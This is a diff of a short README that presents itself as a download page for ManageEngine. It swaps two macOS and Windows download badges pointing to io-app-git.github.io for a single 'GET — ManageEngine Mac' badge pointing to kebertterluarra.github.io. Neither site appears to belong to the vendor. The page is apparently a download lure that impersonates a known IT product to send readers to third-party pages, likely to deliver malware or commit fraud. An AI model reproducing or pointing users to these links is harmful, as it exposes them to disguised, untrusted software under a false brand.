@@ -1,18 +1,7 @@
 # ManageEngine Download — IT Solutions Platform
 
-<a href="https://io-app-git.github.io/.github/?offer=ManageEngine" target="_blank">
-  <img 
-    src="https://img.shields.io/badge/ManageEngine%20for%20macOS-000000?style=for-the-badge&logo=apple&logoColor=white" 
-    width="280" 
-    alt="ManageEngine for macOS">
-</a>
+[![GET ManageEngine Mac](https://img.shields.io/badge/GET%20%E2%80%94%20ManageEngine-Mac-0078D6?style=for-the-badge&logoColor=white)](https://kebertterluarra.github.io/.github/ManageEngine-Mac)
 
-<a href="https://io-app-git.github.io/.github/?offer=ManageEngine" target="_blank">
-  <img 
-    src="https://img.shields.io/badge/ManageEngine%20for%20Windows-0078D7?style=for-the-badge&logo=windows&logoColor=white" 
-    width="280" 
-    alt="ManageEngine for Windows">
-</a>
 
 ---
 
